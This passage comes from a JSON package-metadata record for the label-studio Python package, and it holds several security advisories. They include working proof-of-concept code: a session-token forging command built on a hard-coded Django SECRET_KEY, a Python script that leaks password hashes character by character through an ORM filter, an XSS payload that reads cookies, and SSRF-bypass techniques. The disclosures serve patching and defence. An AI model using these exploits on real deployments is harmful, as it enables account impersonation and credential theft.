is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.3":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.3/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (==1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.17)","htmlmin (==0.1.12)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.3","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"8caa64dfbc5409ecf829edee7256aae533c395a75f4e97b3a2dbb6afc33890b7","md5":"b8b1963c6bb920f76582b4ca18a9c186","sha256":"528ee9c45b432802613c9611e93701e2fb6cb5d68b552d4f9e421fdfbfe740ec"},"downloads":-1,"filename":"label_studio-0.7.3-py3-none-any.whl","has_sig":false,"md5_digest":"b8b1963c6bb920f76582b4ca18a9c186","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6813164,"upload_time":"2020-07-09T14:58:00","upload_time_iso_8601":"2020-07-09T14:58:00.658429Z","url":"https://files.pythonhosted.org/packages/8c/aa/64dfbc5409ecf829edee7256aae533c395a75f4e97b3a2dbb6afc33890b7/label_studio-0.7.3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"f17c66f2ba0243aba1839418ba3f2365595d593a01f618467eb2a2e98f6c88a0","md5":"125286e09638e7818fc0ac0b235a08d2","sha256":"e455a12fa93d80d0d736c9c97e17a85de7535b2378aac0aabd0acc99e93ffc35"},"downloads":-1,"filename":"label-studio-0.7.3.tar.gz","has_sig":false,"md5_digest":"125286e09638e7818fc0ac0b235a08d2","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6752164,"upload_time":"2020-07-09T14:58:07","upload_time_iso_8601":"2020-07-09T14:58:07.010956Z","url":"https://files.pythonhosted.org/packages/f1/7c/66f2ba0243aba1839418ba3f2365595d593a01f618467eb2a2e98f6c88a0/label-studio-0.7.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on 